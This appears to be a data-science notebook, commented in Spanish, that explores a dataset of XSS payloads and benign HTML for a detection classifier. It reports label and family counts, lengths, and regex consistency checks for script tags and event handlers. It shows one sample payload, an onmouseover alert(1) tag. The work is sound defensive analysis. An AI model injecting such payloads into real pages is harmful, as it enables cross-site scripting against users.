# %%
import os
from pathlib import Path

import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

pd.set_option("display.max_colwidth", 200)
plt.rcParams["figure.figsize"] = (8, 4)

# =========================
# 1. Detectar BASE_DIR
# =========================
cwd = Path.cwd()

def is_project_root(path: Path) -> bool:
    markers = ["requirements.txt", "app", "notebooks"]
    return any((path / m).exists() for m in markers)

if is_project_root(cwd):
    BASE_DIR = cwd
elif cwd.name in {"notebooks", "src"} and is_project_root(cwd.parent):
    BASE_DIR = cwd.parent
else:
    BASE_DIR = cwd

NOTEBOOKS_DIR = BASE_DIR / "notebooks"
NB_DATA_DIR = NOTEBOOKS_DIR / "data"
OUTPUT_DIR = NB_DATA_DIR / "data_processed"

PATH_COMBINED = OUTPUT_DIR / "xss_combined_clean_final.csv"

print("CWD          :", cwd)
print("BASE_DIR     :", BASE_DIR)
print("OUTPUT_DIR   :", OUTPUT_DIR)
print("COMBINED CSV :", PATH_COMBINED)

# =========================
# 2. Cargar dataset combinado final
# =========================

df = pd.read_csv(PATH_COMBINED)

print("\n=== Shape del dataset combinado ===")
print(df.shape)

print("\n=== Columnas ===")
print(df.columns.tolist())

print("\n=== Tipos de datos ===")
print(df.dtypes)

print("\n=== Distribución de Label ===")
print(df["Label"].value_counts(dropna=False))

print("\n=== Distribución por source ===")
print(df["source"].value_counts(dropna=False))

print("\n=== Primeras filas ===")
display(df.head(10))

print("\n=== Estadísticas de longitud (len_after_clean) ===")
print(df["len_after_clean"].describe())

print("\n=== Top 15 families_str ===")
print(df["families_str"].value_counts().head(15))
# Out:
# CWD          : d:\Archivos de Usuario\Documents\xss-cookie\notebooks
# BASE_DIR     : d:\Archivos de Usuario\Documents\xss-cookie
# OUTPUT_DIR   : d:\Archivos de Usuario\Documents\xss-cookie\notebooks\data\data_processed
# COMBINED CSV : d:\Archivos de Usuario\Documents\xss-cookie\notebooks\data\data_processed\xss_combined_clean_final.csv
#
# === Shape del dataset combinado ===
# (15351, 5)
#
# === Columnas ===
# ['Sentence_clean', 'Label', 'families_str', 'len_after_clean', 'source']
#
# === Tipos de datos ===
# Sentence_clean     object
# Label               int64
# families_str       object
# len_after_clean     int64
# source             object
# dtype: object
#
# === Distribución de Label ===
# 1    11703
# 0     3648
# Name: Label, dtype: int64
#
# === Distribución por source ===
# kaggle    10835
# github     4516
# Name: source, dtype: int64
#
# === Primeras filas ===
#                                                                                                                                                                                             Sentence_clean  \
# 0  <li><a href="/wiki/File:Socrates.png" class="image"><img alt="Socrates.png" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png" decoding="async" width="18" hei...
# 1                                                                                                                                                                     <tt onmouseover="alert(1)">test</tt>
# 2  </span> <span class="reference-text">Steering for the 1995 "<a href="/wiki/History_of_autonomous_cars#1990s" class="mw-redirect" title="History of autonomous cars">No Hands Across America </a>" re...
# 3  </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.mileseducation.com/finance/artificial_intelligence">"Miles Education | Fut...
# 4  </span>. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2FS0921-8890%2805%2980025-9">10....
# 5                                                                                                             <li id="cite_note-118"><span class="mw-cite-backlink"><b><a href="#cite_ref-118">^ </a> </b>
# 6                                                                                                                         <li><a href="/wiki/Contextualism" title="Contextualism">Contextualism </a> </li>
# 7  <li id="cite_note-Representing_causation-95"><span class="mw-cite-backlink">^ <a href="#cite_ref-Representing_causation_95-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-Representing_cau...
# 8                                                                                                                                                 <tr><td class="plainlist" style="padding:0 0.1em 0.4em">
# 9                                                                                                                                                                                                  </span>
#
#    Label    families_str  len_after_clean  source
# 0      0       image_tag              557  kaggle
# 1      1   event_handler               36  kaggle
# 2      0           other              230  kaggle
# 3      0  maybe_polyglot              392  kaggle
# 4      0           other              419  kaggle
# 5      0           other               92  kaggle
# 6      0           other               80  kaggle
# 7      0           other              243  kaggle
# 8      0           other               56  kaggle
# 9      0           other                7  kaggle
# === Estadísticas de longitud (len_after_clean) ===
# count    15351.000000
# mean       117.233470
# std        204.133168
# min          5.000000
# 25%         44.000000
# 50%         61.000000
# 75%        102.000000
# max       2854.000000
# Name: len_after_clean, dtype: float64
#
# === Top 15 families_str ===
# event_handler                        6082
# other                                2963
# script_tag                           2651
# maybe_polyglot                        704
# event_handler|maybe_polyglot          696
# script_tag|marquee_tag|header_tag     300
# event_handler|svg_tag                 188
# iframe_tag                            184
# img_tag|event_onerror                 146
# event_onmouseover                     123
# script_tag|header_tag                 110
# marquee_tag|header_tag                 90
# body_tag|event_onload                  81
# event_handler|image_tag                76
# img_tag                                60
# Name: families_str, dtype: int64

# %%
# ================================
# Análisis profundo – Parte 1
# ================================

import pandas as pd
import numpy as np

print("Shape:", df.shape)

# Aumentamos el máximo de filas que muestra pandas para que NO corte familias
pd.set_option("display.max_rows", 200)

# =======================================================
# 1. Distribución de familias por fuente (Kaggle vs GitHub)
# =======================================================

print("\n=== Distribución de familias por 'source' (tabla legible) ===")

# Conteo por (families_str, source) en formato largo
fam_counts_long = (
    df.groupby(["families_str", "source"])
      .size()
      .reset_index(name="count")
)

# Pivot para tener columnas 'kaggle' y 'github' y filas = families_str
fam_counts = (
    fam_counts_long
    .pivot(index="families_str", columns="source", values="count")
    .fillna(0)
    .astype(int)
)

# Agregar columna 'total' y ordenar por total descendente
fam_counts["total"] = fam_counts.sum(axis=1)
fam_counts = fam_counts.sort_values("total", ascending=False)

display(fam_counts)

print("\nNúmero total de familias distintas:", fam_counts.shape[0])

print("\n=== Todas las familias en Kaggle (conteo) ===")
familias_kaggle = df[df["source"] == "kaggle"]["families_str"].value_counts()
display(familias_kaggle)
print("Número de familias distintas en Kaggle:", familias_kaggle.shape[0])

print("\n=== Todas las familias en GitHub (conteo) ===")
familias_github = df[df["source"] == "github"]["families_str"].value_counts()
display(familias_github)
print("Número de familias distintas en GitHub:", familias_github.shape[0])

# =======================================================
# 2. Pureza: porcentaje de ataques por familia
# =======================================================

print("\n=== Pureza por familia (proporción de Label=1) ===")
purity = df.groupby("families_str")["Label"].mean().sort_values(ascending=False)
display(purity)

# familias con ataques casi puros (>95%)
attack_pure = purity[purity > 0.95]
print("\nFamilias casi 100% ataque (pureza > 0.95):")
display(attack_pure)

# familias con mezcla fuerte (<70%)
mixed = purity[purity < 0.7]
print("\nFamilias mixtas (pureza < 0.7, posible ruido):")
display(mixed)

# =======================================================
# 3. Estadísticas de longitud por familia
# =======================================================

print("\n=== Longitud por familia (describe por families_str) ===")
len_stats = (
    df.groupby("families_str")["len_after_clean"]
      .describe()
      .sort_values("mean", ascending=False)
)
display(len_stats)

print("\n=== Familias con longitud promedio > 300 (payloads muy largos) ===")
display(len_stats[len_stats["mean"] > 300])

# =======================================================
# 4. Detección de families_str inconsistentes
# =======================================================

print("\n=== Payloads con <script ...> pero marcados como 'other' ===")
mask_inconsistent = (
    df["Sentence_clean"].str.contains("<script", case=False, na=False)
    & (df["families_str"] == "other")
)
df_inconsistent = df[mask_inconsistent]
print("Total inconsistentes script/other:", df_inconsistent.shape[0])
display(df_inconsistent)

print("\n=== Payloads con onXXX= pero sin 'event_' en families_str ===")
mask_event_missing = (
    df["Sentence_clean"].str.contains(r"on[a-z]+\s*=", case=True, regex=True, na=False)
    & ~df["families_str"].str.contains("event_", na=False)
)
df_event_missing = df[mask_event_missing]
print("Total inconsistentes onXXX sin event_:", df_event_missing.shape[0])
display(df_event_missing)

# =======================================================
# 5. Duplicados aproximados (misma longitud y misma familia)
# =======================================================

print("\n=== Posibles duplicados por longitud + familia (todas las combinaciones ordenadas por frecuencia) ===")
dup_groups = (
    df.groupby(["len_after_clean", "families_str"])
      .size()
      .sort_values(ascending=False)
)
display(dup_groups)
# Out:
# Shape: (15351, 5)
#
# === Distribución de familias por 'source' (tabla legible) ===
# source                                                                   github  \
# families_str
# event_handler                                                                 0
# other                                                                       131
# script_tag                                                                 2610
# maybe_polyglot                                                                0
# event_handler|maybe_polyglot                                                  0
# script_tag|marquee_tag|header_tag                                           300
# event_handler|svg_tag                                                         0
# iframe_tag                                                                  182
# img_tag|event_onerror                                                       146
# event_onmouseover                                                           123
# script_tag|header_tag                                                       110
# marquee_tag|header_tag                                                       90
# body_tag|event_onload                                                        81
# event_handler|image_tag                                                       0
# img_tag                                                                      60
# image_tag                                                                     0
# script_tag|event_handler                                                      0
# script_tag|iframe_tag                                                        52
# text_container_tag                                                           51
# event_handler|iframe_tag                                                      0
# event_onload                                                                 35
# script_tag|img_tag                                                           33
# marquee_tag                                                                  32
# header_tag                                                                   27
# event_onerror                                                                25
# javascript_uri                                                                0
# script_tag|marquee_tag                                                       23
# iframe_tag|event_onload                                                      22
# script_tag|plain_tag|text_container_tag                                      21
# script_tag|text_container_tag                                                21
# body_tag                                                                     16
# script_tag|body_tag                                                          12
# event_onmousemove                                                            11
# event_onfocus                                                                10
# script_tag|event_onload                                                      10
# javascript_uri|image_tag                                                      0
# marquee_tag|img_tag|header_tag|event_onerror                                  9
# marquee_tag|body_tag|header_tag|event_onload                                  8
# text_container_tag|event_onmouseover                                          8
# event_onclick                                                                 8
# script_tag|event_onmouseover                                                  8
# script_tag|marquee_tag|iframe_tag|img_tag|header_tag|text_container_tag       8
# marquee_tag|text_container_tag                                                7
# script_tag|marquee_tag|text_container_tag                                     7
# script_tag|iframe_tag|img_tag|text_container_tag                              7
# script_tag|img_tag|body_tag|event_onload                                      7
# img_tag|event_onmouseover                                                     7
# script_tag|body_tag|event_onload                                              6
# img_tag|event_onload                                                          6
# iframe_tag|header_tag                                                         6
# marquee_tag|iframe_tag|header_tag                                             6
# img_tag|header_tag                                                            6
# script_tag|marquee_tag|iframe_tag|img_tag                                     5
# event_handler|iframe_tag|maybe_polyglot                                       0
# script_tag|header_tag|text_container_tag                                      5
# event_handler|svg_tag|maybe_polyglot                                          0
# img_tag|text_container_tag                                                    5
# script_tag|marquee_tag|img_tag|header_tag                                     4
# script_tag|marquee_tag|img_tag|header_tag|text_container_tag                  4
# script_tag|img_tag|header_tag|text_container_tag                              4
# body_tag|header_tag|event_onload                                              4
# script_tag|img_tag|event_onerror                                              4
# text_container_tag|event_onmouseover|event_onclick                            4
# event_onload|event_onerror                                                    4
# script_tag|iframe_tag|body_tag                                                4
# script_tag|plain_tag                                                          3
# marquee_tag|img_tag|event_onerror                                             3
# event_onreadystatechange                                                      3
# marquee_tag|header_tag|text_container_tag                                     3
# marquee_tag|header_tag|plain_tag|text_container_tag                           3
# script_tag|marquee_tag|body_tag|header_tag|event_onload                       3
# header_tag|event_onmouseover                                                  3
# event_handler|javascript_uri                                                  0
# iframe_tag|body_tag                                                           3
# iframe_tag|event_onmouseover                                                  3
# script_tag|event_onreadystatechange                                           3
# iframe_tag|img_tag|event_onerror                                              3
# script_tag|event_onerror                                                      3
# img_tag|body_tag|event_onload                                                 3
# script_tag|img_tag|text_container_tag                                         3
# script_tag|img_tag|event_onload                                               2
# body_tag|text_container_tag|event_onload                                      2
# script_tag|iframe_tag|body_tag|event_onload                                   2
# script_tag|body_tag|plain_tag                                                 2
# script_tag|iframe_tag|header_tag                                              2
# marquee_tag|img_tag                                                           2
# script_tag|text_container_tag|event_onclick                                   2
# event_onunload                                                                2
# header_tag|text_container_tag                                                 2
# iframe_tag|body_tag|event_onload                                              2
# text_container_tag|event_onload                                               2
# iframe_tag|img_tag                                                            2
# iframe_tag|img_tag|text_container_tag                                         2
# iframe_tag|text_container_tag                                                 2
# script_tag|iframe_tag|img_tag|body_tag                                        2
# marquee_tag|iframe_tag                                                        2
# script_tag|marquee_tag|iframe_tag|header_tag                                  2
# script_tag|img_tag|event_onmouseover                                          1
# script_tag|marquee_tag|body_tag|text_container_tag                            1
# body_tag|event_onunload                                                       1
# script_tag|img_tag|header_tag                                                 1
# script_tag|iframe_tag|text_container_tag                                      1
# script_tag|iframe_tag|text_container_tag|event_onload                         1
# body_tag|event_onfocus                                                        1
# script_tag|marquee_tag|img_tag                                                1
# body_tag|event_onmouseover                                                    1
# script_tag|text_container_tag|event_onmouseover                               1
# script_tag|image_tag                                                          0
# body_tag|header_tag|event_onload|event_onunload                               1
# script_tag|img_tag|text_container_tag|event_onmouseover                       1
# script_tag|img_tag|body_tag|text_container_tag|event_onload                   1
# body_tag|event_onmousemove                                                    1
# script_tag|svg_tag                                                            0
# script_tag|marquee_tag|header_tag|event_onmouseover                           1
# plain_tag|text_container_tag|event_onmouseover                                1
# script_tag|iframe_tag|header_tag|text_container_tag|event_onerror             1
# event_handler|javascript_uri|svg_tag                                          0
# event_handler|javascript_uri|maybe_polyglot                                   0
# img_tag|text_container_tag|event_onmouseover                                  1
# img_tag|text_container_tag|event_onload                                       1
# img_tag|text_container_tag|event_onerror                                      1
# img_tag|text_container_tag|event_onclick                                      1
# img_tag|header_tag|text_container_tag|event_onerror                           1
# img_tag|event_onload|event_onreadystatechange                                 1
# img_tag|event_onclick                                                         1
# body_tag|header_tag|text_container_tag                                        1
# img_tag|body_tag|text_container_tag|event_onerror                             1
# iframe_tag|plain_tag                                                          1
# iframe_tag|maybe_polyglot                                                     0
# iframe_tag|event_onreadystatechange                                           1
# event_onerror|event_onreadystatechange                                        1
# iframe_tag|event_onerror                                                      1
# event_onmouseover|event_onfocus                                               1
# javascript_uri|iframe_tag                                                     0
# javascript_uri|maybe_polyglot                                                 0
# event_handler|javascript_uri|image_tag                                        0
# marquee_tag|body_tag|header_tag                                               1
# script_tag|header_tag|plain_tag                                               1
# body_tag|header_tag|text_container_tag|event_onload                           1
# script_tag|event_handler|javascript_uri|svg_tag                               0
# script_tag|event_handler|image_tag                                            0
# script_tag|body_tag|text_container_tag                                        1
# script_tag|body_tag|plain_tag|text_container_tag|event_onload                 1
# script_tag|body_tag|header_tag|event_onload                                   1
# event_onload|event_onreadystatechange                                         1
# plain_tag                                                                     1
# event_handler|iframe_tag|svg_tag                                              0
# marquee_tag|text_container_tag|event_onmouseover                              1
# marquee_tag|img_tag|header_tag                                                1
# marquee_tag|iframe_tag|img_tag                                                1
# marquee_tag|iframe_tag|header_tag|event_onload                                1
# body_tag|event_onerror                                                        1
# text_container_tag|event_onmouseover|event_onclick|event_onfocus              1
#
# source                                                                   kaggle  \
# families_str
# event_handler                                                              6082
# other                                                                      2832
# script_tag                                                                   41
# maybe_polyglot                                                              704
# event_handler|maybe_polyglot                                                696
# script_tag|marquee_tag|header_tag                                             0
# event_handler|svg_tag                                                       188
# iframe_tag                                                                    2
# img_tag|event_onerror                                                         0
# event_onmouseover                                                             0
# script_tag|header_tag                                                         0
# marquee_tag|header_tag                                                        0
# body_tag|event_onload                                                         0
# event_handler|image_tag                                                      76
# img_tag                                                                       0
# image_tag                                                                    55
# script_tag|event_handler                                                     54
# script_tag|iframe_tag                                                         0
# text_container_tag                                                            0
# event_handler|iframe_tag                                                     47
# event_onload                                                                  0
# script_tag|img_tag                                                            0
# marquee_tag                                                                   0
# header_tag                                                                    0
# event_onerror                                                                 0
# javascript_uri                                                               24
# script_tag|marquee_tag                                                        0
# iframe_tag|event_onload                                                       0
# script_tag|plain_tag|text_container_tag                                       0
# script_tag|text_container_tag                                                 0
# body_tag                                                                      0
# script_tag|body_tag                                                           0
# event_onmousemove                                                             0
# event_onfocus                                                                 0
# script_tag|event_onload                                                       0
# javascript_uri|image_tag                                                     10
# marquee_tag|img_tag|header_tag|event_onerror                                  0
# marquee_tag|body_tag|header_tag|event_onload                                  0
# text_container_tag|event_onmouseover                                          0
# event_onclick                                                                 0
# script_tag|event_onmouseover                                                  0
# script_tag|marquee_tag|iframe_tag|img_tag|header_tag|text_container_tag       0
# marquee_tag|text_container_tag                                                0
# script_tag|marquee_tag|text_container_tag                                     0
# script_tag|iframe_tag|img_tag|text_container_tag                              0
# script_tag|img_tag|body_tag|event_onload                                      0
# img_tag|event_onmouseover                                                     0
# script_tag|body_tag|event_onload                                              0
# img_tag|event_onload                                                          0
# iframe_tag|header_tag                                                         0
# marquee_tag|iframe_tag|header_tag                                             0
# img_tag|header_tag                                                            0
# script_tag|marquee_tag|iframe_tag|img_tag                                     0
# event_handler|iframe_tag|maybe_polyglot                                       5
# script_tag|header_tag|text_container_tag                                      0
# event_handler|svg_tag|maybe_polyglot                                          5
# img_tag|text_container_tag                                                    0
# script_tag|marquee_tag|img_tag|header_tag                                     0
# script_tag|marquee_tag|img_tag|header_tag|text_container_tag                  0
# script_tag|img_tag|header_tag|text_container_tag                              0
# body_tag|header_tag|event_onload                                              0
# script_tag|img_tag|event_onerror                                              0
# text_container_tag|event_onmouseover|event_onclick                            0
# event_onload|event_onerror                                                    0
# script_tag|iframe_tag|body_tag                                                0
# script_tag|plain_tag                                                          0
# marquee_tag|img_tag|event_onerror                                             0
# event_onreadystatechange                                                      0
# marquee_tag|header_tag|text_container_tag                                     0
# marquee_tag|header_tag|plain_tag|text_container_tag                           0
# script_tag|marquee_tag|body_tag|header_tag|event_onload                       0
# header_tag|event_onmouseover                                                  0
# event_handler|javascript_uri                                                  3
# iframe_tag|body_tag                                                           0
# iframe_tag|event_onmouseover                                                  0
# script_tag|event_onreadystatechange                                           0
# iframe_tag|img_tag|event_onerror                                              0
# script_tag|event_onerror                                                      0
# img_tag|body_tag|event_onload                                                 0
# script_tag|img_tag|text_container_tag                                         0
# script_tag|img_tag|event_onload                                               0
# body_tag|text_container_tag|event_onload                                      0
# script_tag|iframe_tag|body_tag|event_onload                                   0
# script_tag|body_tag|plain_tag                                                 0
# script_tag|iframe_tag|header_tag                                              0
# marquee_tag|img_tag                                                           0
# script_tag|text_container_tag|event_onclick                                   0
# event_onunload                                                                0
# header_tag|text_container_tag                                                 0
# iframe_tag|body_tag|event_onload                                              0
# text_container_tag|event_onload                                               0
# iframe_tag|img_tag                                                            0
# iframe_tag|img_tag|text_container_tag                                         0
# iframe_tag|text_container_tag                                                 0
# script_tag|iframe_tag|img_tag|body_tag                                        0
# marquee_tag|iframe_tag                                                        0
# script_tag|marquee_tag|iframe_tag|header_tag                                  0
# script_tag|img_tag|event_onmouseover                                          0
# script_tag|marquee_tag|body_tag|text_container_tag                            0
# body_tag|event_onunload                                                       0
# script_tag|img_tag|header_tag                                                 0
# script_tag|iframe_tag|text_container_tag                                      0
# script_tag|iframe_tag|text_container_tag|event_onload                         0
# body_tag|event_onfocus                                                        0
# script_tag|marquee_tag|img_tag                                                0
# body_tag|event_onmouseover                                                    0
# script_tag|text_container_tag|event_onmouseover                               0
# script_tag|image_tag                                                          1
# body_tag|header_tag|event_onload|event_onunload                               0
# script_tag|img_tag|text_container_tag|event_onmouseover                       0
# script_tag|img_tag|body_tag|text_container_tag|event_onload                   0
# body_tag|event_onmousemove                                                    0
# script_tag|svg_tag                                                            1
# script_tag|marquee_tag|header_tag|event_onmouseover                           0
# plain_tag|text_container_tag|event_onmouseover                                0
# script_tag|iframe_tag|header_tag|text_container_tag|event_onerror             0
# event_handler|javascript_uri|svg_tag                                          1
# event_handler|javascript_uri|maybe_polyglot                                   1
# img_tag|text_container_tag|event_onmouseover                                  0
# img_tag|text_container_tag|event_onload                                       0
# img_tag|text_container_tag|event_onerror                                      0
# img_tag|text_container_tag|event_onclick                                      0
# img_tag|header_tag|text_container_tag|event_onerror                           0
# img_tag|event_onload|event_onreadystatechange                                 0
# img_tag|event_onclick                                                         0
# body_tag|header_tag|text_container_tag                                        0
# img_tag|body_tag|text_container_tag|event_onerror                             0
# iframe_tag|plain_tag                                                          0
# iframe_tag|maybe_polyglot                                                     1
# iframe_tag|event_onreadystatechange                                           0
# event_onerror|event_onreadystatechange                                        0
# iframe_tag|event_onerror                                                      0
# event_onmouseover|event_onfocus                                               0
# javascript_uri|iframe_tag                                                     1
# javascript_uri|maybe_polyglot                                                 1
# event_handler|javascript_uri|image_tag                                        1
# marquee_tag|body_tag|header_tag                                               0
# script_tag|header_tag|plain_tag                                               0
# body_tag|header_tag|text_container_tag|event_onload                           0
# script_tag|event_handler|javascript_uri|svg_tag                               1
# script_tag|event_handler|image_tag                                            1
# script_tag|body_tag|text_container_tag                                        0
# script_tag|body_tag|plain_tag|text_container_tag|event_onload                 0
# script_tag|body_tag|header_tag|event_onload                                   0
# event_onload|event_onreadystatechange                                         0
# plain_tag                                                                     0
# event_handler|iframe_tag|svg_tag                                              1
# marquee_tag|text_container_tag|event_onmouseover                              0
# marquee_tag|img_tag|header_tag                                                0
# marquee_tag|iframe_tag|img_tag                                                0
# marquee_tag|iframe_tag|header_tag|event_onload                                0
# body_tag|event_onerror                                                        0
# text_container_tag|event_onmouseover|event_onclick|event_onfocus              0
#
# source                                                                   total
# families_str
# event_handler                                                             6082
# other                                                                     2963
# script_tag                                                                2651
# maybe_polyglot                                                             704
# event_handler|maybe_polyglot                                               696
# script_tag|marquee_tag|header_tag                                          300
# event_handler|svg_tag                                                      188
# iframe_tag                                                                 184
# img_tag|event_onerror                                                      146
# event_onmouseover                                                          123
# script_tag|header_tag                                                      110
# marquee_tag|header_tag                                                      90
# body_tag|event_onload                                                       81
# event_handler|image_tag                                                     76
# img_tag                                                                     60
# image_tag                                                                   55
# script_tag|event_handler                                                    54
# script_tag|iframe_tag                                                       52
# text_container_tag                                                          51
# event_handler|iframe_tag                                                    47
# event_onload                                                                35
# script_tag|img_tag                                                          33
# marquee_tag                                                                 32
# header_tag                                                                  27
# event_onerror                                                               25
# javascript_uri                                                              24
# script_tag|marquee_tag                                                      23
# iframe_tag|event_onload                                                     22
# script_tag|plain_tag|text_container_tag                                     21
# script_tag|text_container_tag                                               21
# body_tag                                                                    16
# script_tag|body_tag                                                         12
# event_onmousemove                                                           11
# event_onfocus                                                               10
# script_tag|event_onload                                                     10
# javascript_uri|image_tag                                                    10
# marquee_tag|img_tag|header_tag|event_onerror                                 9
# marquee_tag|body_tag|header_tag|event_onload                                 8
# text_container_tag|event_onmouseover                                         8
# event_onclick                                                                8
# script_tag|event_onmouseover                                                 8
# script_tag|marquee_tag|iframe_tag|img_tag|header_tag|text_container_tag      8
# marquee_tag|text_container_tag                                               7
# script_tag|marquee_tag|text_container_tag                                    7
# script_tag|iframe_tag|img_tag|text_container_tag                             7
# script_tag|img_tag|body_tag|event_onload                                     7
# img_tag|event_onmouseover                                                    7
# script_tag|body_tag|event_onload                                             6
# img_tag|event_onload                                                         6
# iframe_tag|header_tag                                                        6
# marquee_tag|iframe_tag|header_tag                                            6
# img_tag|header_tag                                                           6
# script_tag|marquee_tag|iframe_tag|img_tag                                    5
# event_handler|iframe_tag|maybe_polyglot                                      5
# script_tag|header_tag|text_container_tag                                     5
# event_handler|svg_tag|maybe_polyglot                                         5
# img_tag|text_container_tag                                                   5
# script_tag|marquee_tag|img_tag|header_tag                                    4
# script_tag|marquee_tag|img_tag|header_tag|text_container_tag                 4
# script_tag|img_tag|header_tag|text_container_tag                             4
# body_tag|header_tag|event_onload                                             4
# script_tag|img_tag|event_onerror                                             4
# text_container_tag|event_onmouseover|event_onclick                           4
# event_onload|event_onerror                                                   4
# script_tag|iframe_tag|body_tag                                               4
# script_tag|plain_tag                                                         3
# marquee_tag|img_tag|event_onerror                                            3
# event_onreadystatechange                                                     3
# marquee_tag|header_tag|text_container_tag                                    3
# marquee_tag|header_tag|plain_tag|text_container_tag                          3
# script_tag|marquee_tag|body_tag|header_tag|event_onload                      3
# header_tag|event_onmouseover                                                 3
# event_handler|javascript_uri                                                 3
# iframe_tag|body_tag                                                          3
# iframe_tag|event_onmouseover                                                 3
# script_tag|event_onreadystatechange                                          3
# iframe_tag|img_tag|event_onerror                                             3
# script_tag|event_onerror                                                     3
# img_tag|body_tag|event_onload                                                3
# script_tag|img_tag|text_container_tag                                        3
# script_tag|img_tag|event_onload                                              2
# body_tag|text_container_tag|event_onload                                     2
# script_tag|iframe_tag|body_tag|event_onload                                  2
# script_tag|body_tag|plain_tag                                                2
# script_tag|iframe_tag|header_tag                                             2
# marquee_tag|img_tag                                                          2
# script_tag|text_container_tag|event_onclick                                  2
# event_onunload                                                               2
# header_tag|text_container_tag                                                2
# iframe_tag|body_tag|event_onload                                             2
# text_container_tag|event_onload                                              2
# iframe_tag|img_tag                                                           2
# iframe_tag|img_tag|text_container_tag                                        2
# iframe_tag|text_container_tag                                                2
# script_tag|iframe_tag|img_tag|body_tag                                       2
# marquee_tag|iframe_tag                                                       2
# script_tag|marquee_tag|iframe_tag|header_tag                                 2
# script_tag|img_tag|event_onmouseover                                         1
# script_tag|marquee_tag|body_tag|text_container_tag                           1
# body_tag|event_onunload                                                      1
# script_tag|img_tag|header_tag                                                1
# script_tag|iframe_tag|text_container_tag                                     1
# script_tag|iframe_tag|text_container_tag|event_onload                        1
# body_tag|event_onfocus                                                       1
# script_tag|marquee_tag|img_tag                                               1
# body_tag|event_onmouseover                                                   1
# script_tag|text_container_tag|event_onmouseover                              1
# script_tag|image_tag                                                         1
# body_tag|header_tag|event_onload|event_onunload                              1
# script_tag|img_tag|text_container_tag|event_onmouseover                      1
# script_tag|img_tag|body_tag|text_container_tag|event_onload                  1
# body_tag|event_onmousemove                                                   1
# script_tag|svg_tag                                                           1
# script_tag|marquee_tag|header_tag|event_onmouseover                          1
# plain_tag|text_container_tag|event_onmouseover                               1
# script_tag|iframe_tag|header_tag|text_container_tag|event_onerror            1
# event_handler|javascript_uri|svg_tag                                         1
# event_handler|javascript_uri|maybe_polyglot                                  1
# img_tag|text_container_tag|event_onmouseover                                 1
# img_tag|text_container_tag|event_onload                                      1
# img_tag|text_container_tag|event_onerror                                     1
# img_tag|text_container_tag|event_onclick                                     1
# img_tag|header_tag|text_container_tag|event_onerror                          1
# img_tag|event_onload|event_onreadystatechange                                1
# img_tag|event_onclick                                                        1
# body_tag|header_tag|text_container_tag                                       1
# img_tag|body_tag|text_container_tag|event_onerror                            1
# iframe_tag|plain_tag                                                         1
# iframe_tag|maybe_polyglot                                                    1
# iframe_tag|event_onreadystatechange                                          1
# event_onerror|event_onreadystatechange                                       1
# iframe_tag|event_onerror                                                     1
# event_onmouseover|event_onfocus                                              1
# javascript_uri|iframe_tag                                                    1
# javascript_uri|maybe_polyglot                                                1
# event_handler|javascript_uri|image_tag                                       1
# marquee_tag|body_tag|header_tag                                              1
# script_tag|header_tag|plain_tag                                              1
# body_tag|header_tag|text_container_tag|event_onload                          1
# script_tag|event_handler|javascript_uri|svg_tag                              1
# script_tag|event_handler|image_tag                                           1
# script_tag|body_tag|text_container_tag                                       1
# script_tag|body_tag|plain_tag|text_container_tag|event_onload                1
# script_tag|body_tag|header_tag|event_onload                                  1
# event_onload|event_onreadystatechange                                        1
# plain_tag                                                                    1
# event_handler|iframe_tag|svg_tag                                             1
# marquee_tag|text_container_tag|event_onmouseover                             1
# marquee_tag|img_tag|header_tag                                               1
# marquee_tag|iframe_tag|img_tag                                               1
# marquee_tag|iframe_tag|header_tag|event_onload                               1
# body_tag|event_onerror                                                       1
# text_container_tag|event_onmouseover|event_onclick|event_onfocus             1
# Número total de familias distintas: 153
#
# === Todas las familias en Kaggle (conteo) ===
# event_handler                                      6082
# other                                              2832
# maybe_polyglot                                      704
# event_handler|maybe_polyglot                        696
# event_handler|svg_tag                               188
# event_handler|image_tag                              76
# image_tag                                            55
# script_tag|event_handler                             54
# event_handler|iframe_tag                             47
# script_tag                                           41
# javascript_uri                                       24
# javascript_uri|image_tag                             10
# event_handler|iframe_tag|maybe_polyglot               5
# event_handler|svg_tag|maybe_polyglot                  5
# event_handler|javascript_uri                          3
# iframe_tag                                            2
# script_tag|event_handler|image_tag                    1
# script_tag|image_tag                                  1
# javascript_uri|maybe_polyglot                         1
# event_handler|iframe_tag|svg_tag                      1
# event_handler|javascript_uri|svg_tag                  1
# iframe_tag|maybe_polyglot                             1
# event_handler|javascript_uri|image_tag                1
# event_handler|javascript_uri|maybe_polyglot           1
# script_tag|svg_tag                                    1
# script_tag|event_handler|javascript_uri|svg_tag       1
# javascript_uri|iframe_tag                             1
# Name: families_str, dtype: int64
# Número de familias distintas en Kaggle: 27
#
# === Todas las familias en GitHub (conteo) ===
# script_tag                                                                 2610
# script_tag|marquee_tag|header_tag                                           300
# iframe_tag                                                                  182
# img_tag|event_onerror                                                       146
# other                                                                       131
# event_onmouseover                                                           123
# script_tag|header_tag                                                       110
# marquee_tag|header_tag                                                       90
# body_tag|event_onload                                                        81
# img_tag                                                                      60
# script_tag|iframe_tag                                                        52
# text_container_tag                                                           51
# event_onload                                                                 35
# script_tag|img_tag                                                           33
# marquee_tag                                                                  32
# header_tag                                                                   27
# event_onerror                                                                25
# script_tag|marquee_tag                                                       23
# iframe_tag|event_onload                                                      22
# script_tag|plain_tag|text_container_tag                                      21
# script_tag|text_container_tag                                                21
# body_tag                                                                     16
# script_tag|body_tag                                                          12
# event_onmousemove                                                            11
# script_tag|event_onload                                                      10
# event_onfocus                                                                10
# marquee_tag|img_tag|header_tag|event_onerror                                  9
# event_onclick                                                                 8
# marquee_tag|body_tag|header_tag|event_onload                                  8
# script_tag|marquee_tag|iframe_tag|img_tag|header_tag|text_container_tag       8
# text_container_tag|event_onmouseover                                          8
# script_tag|event_onmouseover                                                  8
# script_tag|img_tag|body_tag|event_onload                                      7
# script_tag|iframe_tag|img_tag|text_container_tag                              7
# script_tag|marquee_tag|text_container_tag                                     7
# marquee_tag|text_container_tag                                                7
# img_tag|event_onmouseover                                                     7
# marquee_tag|iframe_tag|header_tag                                             6
# img_tag|header_tag                                                            6
# iframe_tag|header_tag                                                         6
# script_tag|body_tag|event_onload                                              6
# img_tag|event_onload                                                          6
# script_tag|marquee_tag|iframe_tag|img_tag                                     5
# script_tag|header_tag|text_container_tag                                      5
